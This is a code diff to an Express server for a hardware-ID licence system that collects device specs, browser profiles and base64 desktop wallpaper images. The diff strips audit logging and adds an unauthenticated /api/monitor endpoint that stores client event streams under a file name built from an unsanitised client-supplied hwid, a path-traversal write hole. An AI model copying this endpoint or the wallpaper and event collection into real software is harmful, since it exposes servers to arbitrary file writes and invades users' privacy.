@@ -1,4 +1,4 @@
-// server.js - Complete with Wallpaper Support
+// server.js - Complete with All Endpoints
 
 require('dotenv').config();
 const express = require('express');
@@ -7,6 +7,7 @@ const cors = require('cors');
 const rateLimit = require('express-rate-limit');
 const bcrypt = require('bcrypt');
 const path = require('path');
+const fs = require('fs');
 const db = require('./database-pg');
 
 const app = express();
@@ -55,14 +56,38 @@ app.use(session({
     }
 }));
 
+// ============================================
+// RATE LIMIT - FIXED
+// ============================================
 const limiter = rateLimit({
     windowMs: 15 * 60 * 1000,
-    max: 200,
-    message: { error: 'Too many requests, please try again later.' },
+    max: 500,
+    message: { 
+        error: 'Too many requests, please try again later.',
+        retryAfter: 15 * 60
+    },
     standardHeaders: true,
     legacyHeaders: false,
+    skip: function(req) {
+        const skipPaths = [
+            '/api/dashboard-data',
+            '/api/status/',
+            '/api/code/',
+            '/api/hwid-logs',
+            '/api/hwid-log'
+        ];
+        return skipPaths.some(path => req.path.startsWith(path));
+    }
 });
+
 app.use('/api/', limiter);
+
+const registerLimiter = rateLimit({
+    windowMs: 60 * 1000,
+    max: 10,
+    message: { error: 'Too many registration attempts. Please wait.' }
+});
+app.use('/api/register', registerLimiter);
 
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
@@ -240,12 +265,11 @@ app.post('/api/force-refresh', isApiAuthenticated, async (req, res) => {
 });
 
 // ============================================
-// REGISTER DEVICE - WITH WALLPAPER SUPPORT
+// REGISTER DEVICE
 // ============================================
 
 app.post('/api/register', async (req, res) => {
     console.log('📥 REGISTER REQUEST RECEIVED');
-    console.log('📦 Body keys:', Object.keys(req.body));
     
     const { 
         deviceId, 
@@ -275,7 +299,6 @@ app.post('/api/register', async (req, res) => {
     }
 
     try {
-        // Check if code exists
         const codeInfo = await db.get('SELECT * FROM codes WHERE code = $1', [code.toUpperCase()]);
         if (!codeInfo) {
             return res.status(400).json({
@@ -291,9 +314,6 @@ app.post('/api/register', async (req, res) => {
             });
         }
 
-        // ============================================
-        // LOG HWID ACTIVITY
-        // ============================================
         const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
         const existingHwid = await db.get(
             'SELECT code FROM code_hwids WHERE hwid = $1',
@@ -313,21 +333,8 @@ app.post('/api/register', async (req, res) => {
                 userAgent || 'unknown',
                 browser_profile || 'Default'
             );
-        } else {
-            await db.logHwidActivity(
-                hwid,
-                code,
-                deviceId,
-                'register_attempt',
-                'existing',
-                `Existing HWID attempting to register with code: ${code}`,
-                ip,
-                userAgent || 'unknown',
-                browser_profile || 'Default'
-            );
         }
 
-        // Check if HWID is authorized
         const isAuthorized = await db.isHwidAuthorized(code.toUpperCase(), hwid);
 
         if (!isAuthorized) {
@@ -340,33 +347,13 @@ app.post('/api/register', async (req, res) => {
                     console.log(`🔥 Auto-deactivating code ${code} due to HWID limit exceeded`);
                     const deactivateResult = await db.autoDeactivateCode(code.toUpperCase(), 'hwid_limit_exceeded_auto_assign');
                     
-                    await db.logHwidActivity(
-                        hwid,
-                        code,
-                        deviceId,
-                        'auto_deactivated',
-                        'new',
-                        `HWID limit exceeded - Code auto-deactivated. Limit: ${assignResult.max_limit}, Current: ${assignResult.current_count}`,
-                        ip,
-                        userAgent || 'unknown',
-                        browser_profile || 'Default'
-                    );
-                    
-                    await db.logUsage(
-                        deviceId, 
-                        code, 
-                        'hwid_limit_exceeded_auto_deactivated', 
-                        `🚨 HWID limit exceeded for code ${code}. Limit: ${assignResult.max_limit}, Current: ${assignResult.current_count}. AUTO-DEACTIVATED!`
-                    );
-                    
                     return res.status(403).json({
-                        error: `🚨 HWID LIMIT EXCEEDED! Code ${code} has been AUTO-DEACTIVATED. Limit: ${assignResult.max_limit}, Current: ${assignResult.current_count}.`,
+                        error: `🚨 HWID LIMIT EXCEEDED! Code ${code} has been AUTO-DEACTIVATED.`,
                         status: 'unauthorized_deactivated',
                         code: code,
                         devices_revoked: deactivateResult.devices_revoked || 0,
                         max_hwid_limit: assignResult.max_limit,
-                        current_hwid_count: assignResult.current_count,
-                        message: `Code auto-deactivated. ${deactivateResult.devices_revoked || 0} devices revoked.`
+                        current_hwid_count: assignResult.current_count
                     });
                 }
                 
@@ -376,25 +363,6 @@ app.post('/api/register', async (req, res) => {
                 );
                 
                 if (otherCode) {
-                    await db.logHwidActivity(
-                        hwid,
-                        code,
-                        deviceId,
-                        'register_blocked',
-                        'existing',
-                        `HWID already registered to code: ${otherCode.code}`,
-                        ip,
-                        userAgent || 'unknown',
-                        browser_profile || 'Default'
-                    );
-                    
-                    await db.logUsage(
-                        deviceId, 
-                        code, 
-                        'hwid_already_registered_attempt', 
-                        `⚠️ HWID ${hwid.substring(0, 16)}... already registered to code ${otherCode.code}`
-                    );
-                    
                     return res.status(403).json({
                         error: `⚠️ This computer is already registered to code: ${otherCode.code}`,
                         status: 'hwid_already_registered',
@@ -411,30 +379,8 @@ app.post('/api/register', async (req, res) => {
             }
             
             console.log(`✅ HWID auto-assigned to code ${code}`);
-            
-            await db.logHwidActivity(
-                hwid,
-                code,
-                deviceId,
-                'auto_assigned',
-                'registered',
-                `HWID auto-assigned to code: ${code}`,
-                ip,
-                userAgent || 'unknown',
-                browser_profile || 'Default'
-            );
-            
-            await db.logUsage(
-                deviceId, 
-                code, 
-                'hwid_auto_assigned', 
-                `✅ HWID ${hwid.substring(0, 16)}... auto-assigned to code ${code}`
-            );
         }
 
-        // ============================================
-        // PARSE HARDWARE SPECS
-        // ============================================
         let parsedHardware = {};
         try {
             parsedHardware = typeof hardware === 'string' ? JSON.parse(hardware) : hardware || {};
@@ -442,32 +388,16 @@ app.post('/api/register', async (req, res) => {
             parsedHardware = {};
         }
 
-        // ============================================
-        // PARSE WALLPAPER DATA - IMPORTANTE!
-        // ============================================
         let parsedWallpaper = null;
         if (wallpaper) {
             try {
                 parsedWallpaper = typeof wallpaper === 'string' ? JSON.parse(wallpaper) : wallpaper;
                 console.log(`🖼️ Wallpaper received: ${parsedWallpaper.file_name || 'unknown'}`);
-                console.log(`   📦 Size: ${parsedWallpaper.size_kb || 0} KB`);
-                console.log(`   📸 Base64 length: ${parsedWallpaper.image_base64 ? parsedWallpaper.image_base64.length : 0} chars`);
-                if (parsedWallpaper.width && parsedWallpaper.height) {
-                    console.log(`   📐 Resolution: ${parsedWallpaper.width}x${parsedWallpaper.height}`);
-                }
-                
-                // 👇 CHECK KUNG MAY BASE64
-                if (!parsedWallpaper.image_base64) {
-                    console.log('   ⚠️ WARNING: No image_base64 in wallpaper data!');
-                }
             } catch (e) {
                 console.log('⚠️ Failed to parse wallpaper data:', e.message);
             }
-        } else {
-            console.log('ℹ️ No wallpaper data received');
         }
 
-        // Extract hardware specs
         const cpuName = parsedHardware.cpu || 'Unknown';
         const gpuName = parsedHardware.gpu || 'Unknown';
         const ramTotal = parsedHardware.ram_gb || 0;
@@ -475,19 +405,6 @@ app.post('/api/register', async (req, res) => {
         const deviceName = parsedHardware.device_name || 'Unknown';
         const profileName = browser_profile || parsedHardware.profile_name || 'Default';
 
-        console.log('🖥️ Hardware Specs Received:');
-        console.log(`   CPU: ${cpuName}`);
-        console.log(`   GPU: ${gpuName}`);
-        console.log(`   RAM: ${ramTotal} GB`);
-        console.log(`   Storage: ${storageTotal} GB`);
-        console.log(`   Profile: ${profileName}`);
-        console.log(`   Device: ${deviceName}`);
-        if (parsedWallpaper) {
-            console.log(`   🖼️ Wallpaper: ${parsedWallpaper.file_name || 'N/A'}`);
-            console.log(`   📸 Base64: ${parsedWallpaper.image_base64 ? '✅ Present (' + parsedWallpaper.image_base64.length + ' chars)' : '❌ MISSING!'}`);
-        }
-
-        // Parse browser info
         let parsedBrowserInfo = {};
         try {
             parsedBrowserInfo = typeof browserInfo === 'string' ? JSON.parse(browserInfo) : browserInfo || {};
@@ -495,9 +412,6 @@ app.post('/api/register', async (req, res) => {
             parsedBrowserInfo = {};
         }
 
-        // ============================================
-        // REGISTER DEVICE WITH WALLPAPER
-        // ============================================
         const result = await db.registerDeviceWithCode(
             deviceId,
             userAgent,
@@ -506,7 +420,7 @@ app.post('/api/register', async (req, res) => {
             code.toUpperCase(),
             hwid,
             parsedHardware,
-            parsedWallpaper  // 👈 IPINAPASA ANG WALLPAPER
+            parsedWallpaper
         );
 
         if (!result.success) {
@@ -516,39 +430,10 @@ app.post('/api/register', async (req, res) => {
             });
         }
 
-        // Log successful registration with wallpaper info
-        let logDetails = `Device registered | Profile: ${profileName} | CPU: ${cpuName} | GPU: ${gpuName} | RAM: ${ramTotal}GB | Storage: ${storageTotal}GB`;
-        if (parsedWallpaper) {
-            logDetails += ` | Wallpaper: ${parsedWallpaper.file_name || 'unknown'} (${parsedWallpaper.size_kb || 0} KB)`;
-            if (parsedWallpaper.width && parsedWallpaper.height) {
-                logDetails += ` | Resolution: ${parsedWallpaper.width}x${parsedWallpaper.height}`;
-            }
-            if (parsedWallpaper.image_base64) {
-                logDetails += ` | Base64: ${parsedWallpaper.image_base64.length} chars`;
-            }
-        }
-        await db.logUsage(deviceId, code, 'register_success', logDetails);
-        
-        await db.logHwidActivity(
-            hwid,
-            code,
-            deviceId,
-            'register_success',
-            'registered',
-            logDetails,
-            ip,
-            userAgent || 'unknown',
-            profileName
-        );
-        
         await db.refreshCache();
 
-        // Get updated code info
         const updatedCodeInfo = await db.getCodeInfo(code.toUpperCase());
 
-        console.log('✅ Registration successful for code:', code);
-
-        // Build response
         const responseData = {
             success: true,
             status: 'approved',
@@ -572,7 +457,6 @@ app.post('/api/register', async (req, res) => {
             message: `✅ Profile registered with hardware specs`
         };
 
-        // 👇 ADD WALLPAPER TO RESPONSE IF AVAILABLE
         if (parsedWallpaper) {
             responseData.wallpaper = {
                 file_name: parsedWallpaper.file_name || 'unknown',
@@ -581,7 +465,6 @@ app.post('/api/register', async (req, res) => {
                 height: parsedWallpaper.height || 0,
                 has_base64: !!parsedWallpaper.image_base64
             };
-            console.log(`🖼️ Wallpaper included in response: ${parsedWallpaper.file_name}`);
         }
 
         res.json(responseData);
@@ -596,7 +479,7 @@ app.post('/api/register', async (req, res) => {
 });
 
 // ============================================
-// STATUS CHECK - WITH WALLPAPER
+// STATUS CHECK
 // ============================================
 
 app.get('/api/status/:deviceId', async (req, res) => {
@@ -791,9 +674,6 @@ app.post('/api/auto-deactivate', async (req, res) => {
     console.log('🚨 AUTO-DEACTIVATE REQUEST RECEIVED!');
     console.log(`📌 Code: ${code}`);
     console.log(`📋 Reason: ${reason}`);
-    console.log(`🖥️ HWIDs: ${hwids ? hwids.length : 0} detected`);
-    console.log(`📱 Device: ${deviceId}`);
-    console.log(`📝 Details: ${details}`);
     
     try {
         const codeInfo = await db.get('SELECT * FROM codes WHERE code = $1', [code]);
@@ -848,6 +728,7 @@ app.post('/api/auto-deactivate', async (req, res) => {
             revokedCount++;
         }
         
+        // Remove all HWIDs
         await db.run(
             'DELETE FROM code_hwids WHERE code = $1',
             [code]
@@ -858,7 +739,7 @@ app.post('/api/auto-deactivate', async (req, res) => {
             [code]
         );
         
-        const logDetails = `🚨 Code ${code} auto-deactivated. Reason: ${reason}. ${revokedCount} devices revoked. HWIDs: ${hwids ? hwids.length : 0} detected. ${details || 'N/A'}`;
+        const logDetails = `🚨 Code ${code} auto-deactivated. Reason: ${reason}. ${revokedCount} devices revoked.`;
         await db.logUsage(
             deviceId || 'system', 
             code, 
@@ -876,7 +757,6 @@ app.post('/api/auto-deactivate', async (req, res) => {
             devices_revoked: revokedCount,
             reason: reason,
             status: status,
-            hwids_count: hwids ? hwids.length : 0,
             message: `Code ${code} auto-deactivated due to: ${reason}. ${revokedCount} devices revoked.`
         });
         
@@ -955,7 +835,6 @@ app.get('/api/dashboard-data', isApiAuthenticated, async (req, res) => {
         await db.cleanupInactiveDevices();
         const cached = db.getCachedData();
         
-        // 👇 ENSURE WALLPAPER DATA IS INCLUDED
         const devicesWithWallpaper = (cached.devices || []).map(device => ({
             ...device,
             wallpaper_base64: device.wallpaper_base64 || null,
@@ -1138,15 +1017,20 @@ app.post('/api/code/:code/deactivate', isApiAuthenticated, async (req, res) => {
     const { code } = req.params;
     
     try {
+        const hwids = await db.getCodeHwids(code);
+        const hwidCount = hwids.length;
+        
         const result = await db.deactivateCode(code);
         
         if (result.success) {
             await db.logUsage('admin', code, 'code_deactivated', 
-                `Code ${code} deactivated by ${req.session.username}`);
+                `Code ${code} deactivated by ${req.session.username}. ${hwidCount} HWIDs removed.`);
             
             res.json({ 
                 success: true, 
-                message: `Code ${code} deactivated! ${result.devicesRemoved} devices removed` 
+                message: `Code ${code} deactivated! ${result.devicesRemoved} devices removed, ${hwidCount} HWIDs removed.`,
+                devices_removed: result.devicesRemoved,
+                hwids_removed: hwidCount
             });
         } else {
             res.status(404).json({ error: 'Code not found' });
@@ -1162,18 +1046,65 @@ app.post('/api/code/:code/reactivate', isApiAuthenticated, async (req, res) => {
     const { subscriptionType = 'Lifetime' } = req.body;
     
     try {
-        const result = await db.reactivateCode(code, subscriptionType);
+        const codeInfo = await db.getCodeInfo(code);
+        if (!codeInfo) {
+            return res.status(404).json({ error: 'Code not found' });
+        }
         
-        if (result.success) {
-            await db.logUsage('admin', code, 'code_reactivated', 
-                `Code ${code} reactivated with ${subscriptionType} by ${req.session.username}`);
+        const hwids = await db.getCodeHwids(code);
+        const hwidCount = hwids.length;
+        
+        // Remove all HWIDs if code was inactive
+        if (!codeInfo.is_active || codeInfo.status === 'inactive' || codeInfo.status.includes('auto_deactivated')) {
+            console.log(`🔄 Reactivating code ${code} - Removing ${hwidCount} HWIDs`);
+            
+            for (const h of hwids) {
+                await db.run(
+                    'DELETE FROM code_hwids WHERE code = $1 AND hwid = $2',
+                    [code, h.hwid]
+                );
+            }
+            
+            await db.run(
+                'UPDATE codes SET hwid = NULL WHERE code = $1',
+                [code]
+            );
+            
+            await db.logUsage(
+                'admin', 
+                code, 
+                'hwid_reset_on_reactivate', 
+                `🗑️ ${hwidCount} HWIDs removed during reactivation of code ${code}`
+            );
+        }
+        
+        const now = new Date().toISOString();
+        const expiresAt = subscriptionType === 'Lifetime' ? null : db.calculateExpiration(now, subscriptionType);
+        
+        const result = await db.run(
+            `UPDATE codes 
+             SET is_active = true, 
+                 status = 'active',
+                 subscription_type = $1,
+                 subscription_started_at = $2,
+                 expires_at = $3
+             WHERE code = $4`,
+            [subscriptionType, now, expiresAt, code]
+        );
+        
+        if (result.changes > 0) {
+            await db.logUsage('admin', code, 'code_reactivated_with_hwid_reset', 
+                `Code ${code} reactivated with ${subscriptionType} by ${req.session.username}. ${hwidCount} HWIDs removed.`);
+            await db.refreshCache();
             
             res.json({ 
                 success: true, 
-                message: `Code reactivated with ${subscriptionType}` 
+                message: `Code reactivated with ${subscriptionType}. ${hwidCount} HWID(s) removed.`,
+                hwids_removed: hwidCount,
+                code: code
             });
         } else {
-            res.status(404).json({ error: result.error || 'Code not found' });
+            res.status(404).json({ error: 'Code not found' });
         }
     } catch (error) {
         console.error('Reactivate code error:', error);
@@ -1232,7 +1163,6 @@ app.delete('/api/device/:deviceId', async (req, res) => {
 // HWID MANAGER
 // ============================================
 
-// Get HWIDs for a code
 app.get('/api/code/:code/hwids', isApiAuthenticated, async (req, res) => {
     const { code } = req.params;
     try {
@@ -1269,7 +1199,6 @@ app.get('/api/code/:code/hwids', isApiAuthenticated, async (req, res) => {
     }
 });
 
-// Get HWID limit for a code
 app.get('/api/code/:code/hwid-limit', isApiAuthenticated, async (req, res) => {
     const { code } = req.params;
     try {
@@ -1287,7 +1216,6 @@ app.get('/api/code/:code/hwid-limit', isApiAuthenticated, async (req, res) => {
     }
 });
 
-// Update HWID limit
 app.put('/api/code/:code/hwid-limit', isApiAuthenticated, async (req, res) => {
     const { code } = req.params;
     const { limit } = req.body;
@@ -1318,7 +1246,6 @@ app.put('/api/code/:code/hwid-limit', isApiAuthenticated, async (req, res) => {
     }
 });
 
-// Assign HWID to code
 app.post('/api/code/:code/hwid', isApiAuthenticated, async (req, res) => {
     const { code } = req.params;
     const { hwid } = req.body;
@@ -1343,7 +1270,6 @@ app.post('/api/code/:code/hwid', isApiAuthenticated, async (req, res) => {
     }
 });
 
-// Remove HWID from code
 app.delete('/api/code/:code/hwid/:hwid', isApiAuthenticated, async (req, res) => {
     const { code, hwid } = req.params;
     
@@ -1399,7 +1325,6 @@ app.delete('/api/code/:code/hwid/:hwid', isApiAuthenticated, async (req, res) =>
 // HWID LOGS ENDPOINTS
 // ============================================
 
-// Get all HWID logs
 app.get('/api/hwid-logs', isApiAuthenticated, async (req, res) => {
     try {
         const limit = parseInt(req.query.limit) || 200;
@@ -1407,29 +1332,8 @@ app.get('/api/hwid-logs', isApiAuthenticated, async (req, res) => {
         
         console.log(`📊 Fetching HWID logs - Limit: ${limit}, Status: ${status}`);
         
-        try {
-            const tableCheck = await db.get(
-                "SELECT EXISTS (SELECT 1 FROM information_schema.tables WHERE table_name = 'hwid_logs')"
-            );
-            
-            if (!tableCheck || !tableCheck.exists) {
-                console.log('⚠️ hwid_logs table does not exist yet');
-                return res.json({
-                    success: true,
-                    logs: [],
-                    new_count: 0,
-                    total: 0,
-                    message: 'Table not created yet'
-                });
-            }
-        } catch (tableError) {
-            console.log('⚠️ Error checking table existence:', tableError.message);
-        }
-        
         const logs = await db.getHwidLogs(limit, status);
         const newCount = await db.getNewHwidCount();
-        
-        console.log(`✅ Retrieved ${logs ? logs.length : 0} HWID logs, ${newCount} new`);
         
         res.json({
             success: true,
@@ -1449,7 +1353,6 @@ app.get('/api/hwid-logs', isApiAuthenticated, async (req, res) => {
     }
 });
 
-// Get HWID logs by HWID
 app.get('/api/hwid-logs/:hwid', isApiAuthenticated, async (req, res) => {
     try {
         const { hwid } = req.params;
@@ -1473,7 +1376,6 @@ app.get('/api/hwid-logs/:hwid', isApiAuthenticated, async (req, res) => {
     }
 });
 
-// Mark HWID as seen
 app.post('/api/hwid-logs/mark-seen', isApiAuthenticated, async (req, res) => {
     try {
         const { hwid } = req.body;
@@ -1492,7 +1394,6 @@ app.post('/api/hwid-logs/mark-seen', isApiAuthenticated, async (req, res) => {
     }
 });
 
-// Get new HWID count
 app.get('/api/hwid-logs/new-count', isApiAuthenticated, async (req, res) => {
     try {
         const count = await db.getNewHwidCount();
@@ -1522,10 +1423,6 @@ app.post('/api/hwid-log', async (req, res) => {
     console.log(`   Action: ${action}`);
     console.log(`   Status: ${status}`);
     console.log(`   Code: ${code || 'null'}`);
-    if (wallpaper) {
-        console.log(`   🖼️ Wallpaper: ${wallpaper.file_name || 'unknown'} (${wallpaper.size_kb || 0} KB)`);
-        console.log(`   📸 Base64: ${wallpaper.image_base64 ? '✅ Present' : '❌ Missing'}`);
-    }
     
     if (!hwid) {
         console.log('❌ HWID log failed: No HWID provided');
@@ -1545,19 +1442,13 @@ app.post('/api/hwid-log', async (req, res) => {
             logStatus = 'existing';
         }
         
-        // Add wallpaper info to details
         let fullDetails = details || 'HWID activity logged';
         if (wallpaper) {
             fullDetails += ` | Wallpaper: ${wallpaper.file_name || 'unknown'} (${wallpaper.size_kb || 0} KB)`;
             if (wallpaper.width && wallpaper.height) {
                 fullDetails += ` | Resolution: ${wallpaper.width}x${wallpaper.height}`;
             }
-            if (wallpaper.image_base64) {
-                fullDetails += ` | Base64: ${wallpaper.image_base64.length} chars`;
-            }
         }
-        
-        console.log(`📝 Logging HWID: ${hwid.substring(0, 16)}... (${logStatus}) - ${action}`);
         
         const result = await db.logHwidActivity(
             hwid,
@@ -1572,7 +1463,6 @@ app.post('/api/hwid-log', async (req, res) => {
         );
         
         if (!result) {
-            console.log('❌ HWID log failed: Database insert returned false');
             return res.status(500).json({ error: 'Failed to save to database' });
         }
         
@@ -1585,7 +1475,7 @@ app.post('/api/hwid-log', async (req, res) => {
                         device_id || 'unknown',
                         'detected_with_other',
                         'new',
-                        `Detected alongside HWID: ${hwid.substring(0, 16)}... ${wallpaper ? '| Wallpaper: ' + wallpaper.file_name : ''}`,
+                        `Detected alongside HWID: ${hwid.substring(0, 16)}...`,
                         ip,
                         user_agent || 'unknown',
                         browser_profile || 'Default'
@@ -1593,8 +1483,6 @@ app.post('/api/hwid-log', async (req, res) => {
                 }
             }
         }
-        
-        console.log(`✅ HWID logged successfully: ${hwid.substring(0, 16)}... (${logStatus})`);
         
         res.json({
             success: true,
@@ -1605,7 +1493,6 @@ app.post('/api/hwid-log', async (req, res) => {
         
     } catch (error) {
         console.error('❌ HWID log error:', error);
-        console.error('❌ Error details:', error.stack);
         res.status(500).json({ 
             success: false,
             error: 'Failed to log HWID: ' + error.message 
@@ -1693,6 +1580,68 @@ app.post('/api/delete-all-codes', isApiAuthenticated, async (req, res) => {
         console.error('Delete all codes error:', error);
         res.status(500).json({ error: 'Failed to delete codes' });
     }
+});
+
+// ============================================
+// MONITORING ENDPOINT
+// ============================================
+
+app.post('/api/monitor', async (req, res) => {
+    const data = req.body;
+    
+    if (data.type === 'heartbeat') {
+        console.log(`💓 Heartbeat from ${data.hwid ? data.hwid.substring(0, 16) + '...' : 'unknown'}`);
+        console.log(`   Queue: ${data.event_queue_size || 0}`);
+        console.log(`   Uptime: ${data.uptime_seconds || 0}s`);
+        if (data.system_stats) {
+            console.log(`   CPU: ${data.system_stats.cpu_percent || 0}%`);
+            console.log(`   Memory: ${data.system_stats.memory_percent || 0}%`);
+        }
+        
+        return res.json({ 
+            success: true, 
+            message: 'Heartbeat received',
+            session_id: data.session_id || 'session_' + Date.now()
+        });
+    }
+    
+    if (data.events && data.events.length > 0) {
+        console.log(`📥 Received ${data.events.length} events from ${data.hwid ? data.hwid.substring(0, 16) + '...' : 'unknown'}`);
+        console.log(`   Session: ${data.session_id || 'none'}`);
+        console.log(`   Event types: ${data.events.map(e => e.type).join(', ')}`);
+        
+        const logDir = path.join(__dirname, 'monitor_logs');
+        if (!fs.existsSync(logDir)) {
+            fs.mkdirSync(logDir, { recursive: true });
+        }
+        
+        const logFile = path.join(logDir, `events_${data.hwid || 'unknown'}_${new Date().toISOString().slice(0,10)}.json`);
+        
+        let existing = [];
+        if (fs.existsSync(logFile)) {
+            try {
+                existing = JSON.parse(fs.readFileSync(logFile, 'utf8'));
+            } catch (e) {
+                existing = [];
+            }
+        }
+        
+        existing.push({
+            timestamp: data.timestamp,
+            events: data.events,
+            system_info: data.system_info
+        });
+        
+        fs.writeFileSync(logFile, JSON.stringify(existing, null, 2));
+        
+        return res.json({ 
+            success: true, 
+            message: `Processed ${data.events.length} events`,
+            session_id: data.session_id || 'session_' + Date.now()
+        });
+    }
+    
+    res.json({ success: true, message: 'No events' });
 });
 
 // ============================================
